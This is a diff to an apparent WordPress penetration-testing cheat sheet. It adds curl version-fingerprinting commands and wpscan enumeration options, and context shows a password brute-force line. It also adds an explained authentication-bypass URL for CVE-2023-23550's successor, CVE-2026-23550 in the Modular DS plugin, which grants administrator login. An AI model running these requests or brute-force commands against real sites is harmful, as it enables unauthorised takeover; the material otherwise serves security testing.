@@ -34,7 +34,9 @@ Press ----> Ctrl + f (Search wordpress)
 
 # Curl
 curl -s http://example.com/ | grep 'WordPress'     # http
+curl -s http://example.com/ | grep -i '?ver='
 curl -s https://example.com/ | grep 'WordPress'    # https
+curl -s https://example.com/ | grep -i '?ver='
 ```
 ### Username
 
@@ -87,10 +89,11 @@ wpscan --url https://google.com -U admin -P /usr/share/wordlists/rockyou.txt --t
 ## ⚡Overall Power
 
 ```bash
-wpscan --url https://example.com/ -e ap,vt,vp,tt,cb,dbe,u,m --api-token <token>  --format json --output scan.json
+wpscan --url https://example.com/ -e vt,tt,cb,dbe,u,m,p  --api-token <token>  --format json --output scan.json
+wpscan --url https://example.com/ --api-token <token> -e p,u --plugins-detection aggressive --plugins-version-detection mixed
 
 ap ---> All plugins
-vp ---> Vulnerable plugins
+p  ---> Vulnerable plugins
 vt ---> Vulnerable themes
 tt ---> Timthumbs
 cb ---> Config backups
@@ -102,6 +105,13 @@ m  ---> Media IDs
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## CVE Exploitation
+
+# CVE-2026-23550
+> The URL bypasses authentication because supplying origin=mo (or a matching User-Agent) together with any type parameter triggers Modular DS's direct request mode, which relaxes the auth middleware to only check whether the site itself has an active Modular connection (rather than verifying the identity of the caller). Since the /login/{modular_request} route defaults to logging in as the site's admin whenever no specific user ID is passed in the request body, this combination lets any unauthenticated user get logged in as an administrator
+
+```bash
+http://example.com/api/modular-connector/login/anything?origin=mo&type=foo
+```
 
 # CVE-2023-6553
 > This cve shows the Remote Code Execution vulnerbility in Backup Migration wordpress Plugin Version=1.3.7 via the /includes/backup-heart.php file. You can Download the backup via /wp-content/uploads/*  directory.
